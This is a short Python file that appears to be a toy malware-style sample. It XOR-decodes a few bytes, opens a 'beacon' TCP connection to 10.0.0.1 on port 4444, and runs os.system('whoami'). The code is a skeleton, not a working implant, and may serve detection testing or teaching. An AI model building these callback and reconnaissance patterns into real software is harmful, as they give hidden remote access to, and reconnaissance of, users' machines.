import os
import socket


def decrypt(data, key):
    out = bytearray(len(data))
    for i in range(len(data)):
        out[i] = data[i] ^ key
    return bytes(out)


def beacon(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    return sock


def main():
    payload = decrypt(b"\x10\x20\x30", 0x55)
    beacon("10.0.0.1", 4444)
    os.system("whoami")
    return payload
